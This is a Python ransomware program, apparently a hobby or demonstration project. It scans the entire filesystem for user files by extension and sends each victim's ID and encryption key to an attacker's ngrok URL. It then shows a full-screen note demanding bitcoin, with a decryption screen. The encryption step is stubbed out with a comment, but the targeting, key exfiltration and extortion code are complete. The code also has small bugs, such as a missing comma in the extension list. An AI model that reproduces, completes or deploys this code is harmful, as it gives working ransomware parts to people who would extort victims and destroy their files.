import os
import platform 
import ssl 
import shutil 
import time
import requests
import ctypes
import subprocess
from datetime import datetime
from os import name, path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import *
from random import randint


digits = randint(1111,9999) 
key = Fernet.generate_key()

url = '' # PUT THE URL YOU GOT FROM NGROK HERE



class ransom0:

    username = os.getlogin()
    PATH = os.getcwd()


    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            
                            'logs',

        )

    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            )




    def clear(self): 
        subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
        os.system('cls' if os.name == 'nt' else 'clear')
    def FindFiles(self):
        f = open("logs/path.txt", "w")
        cnt = 0
        for root, dirs, files in os.walk("/"):
            #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                     if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')
                        print(root)

        f.close()
        f = open("logs/cnt.txt", "w")
        f.write(str(cnt))
        f.close()
        
def SendData(decrypted): 
    now = datetime.now()
    date = now.strftime("%d/%m/%Y %H:%M:%S")

    data = f'[{digits}, {key}, "{date}", "{decrypted}"]'

    requests.post(url, data)

ransom0 = ransom0()



def StartRansom():


    try:
        ransom0.FindFiles()
        filepath = 'logs/path.txt'
        with open(filepath) as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    pass
                    # removed encryption for security purposes
                except Exception:
                    print("!Permission denied")
                line = fp.readline()
        fp.close()
        SendData('false')
    except FileNotFoundError:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()


StartRansom()

PATH = os.getcwd()




def DECRYPT_FILE():
    root= tk.Tk()
    width = root.winfo_screenwidth() # Get screen width
    height = root.winfo_screenheight() # Get screen height


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    #img = tk.PhotoImage(file="lock.ppm")
    #img = img.subsample(2) 
    #img = img.zoom(1)
    #label = tk.Label(root, image=img)
    #label.config(background='black', foreground='red')
    #canvas1.create_window(width/2, height/4, window=label)


    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

    label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*10, window=label1)



    label1 = tk.Label(root, text='KEY:') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
    entry1 = tk.Entry (root) 
    canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)


    def DECRYPT_FILE():

        def decrypt(filename):
            key = entry1.get()
            f = Fernet(key)
            with open(filename, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(filename, "wb") as file:
                file.write(decrypted_data)


        with open('logs/path.txt') as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    decrypt(filename)
                except PermissionError:
                    print("!Permission Denied")
                line = fp.readline()
        label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
        label1.config(font=('helvetica', int(height/50)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
        fp.close()
        shutil.rmtree(PATH+'/logs', ignore_errors=True)

        canvas1.create_window(int(width/2), 340, window=label1)  


    button1 = tk.Button(text='Decrypt', command=DECRYPT_FILE)
    button1.config(background='red')
    canvas1.create_window(int(width/2), int(height/20)*13, window=button1)

    root.mainloop()

    SendData('true')





if __name__ == '__main__':
    # Generate digits ID or read generated value from digits.txt
    if path.exists("logs") is True:
        f = open("logs/digits.txt", "r")
        digits = f.read()
        f.close()
        DECRYPT_FILE()
    else:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()
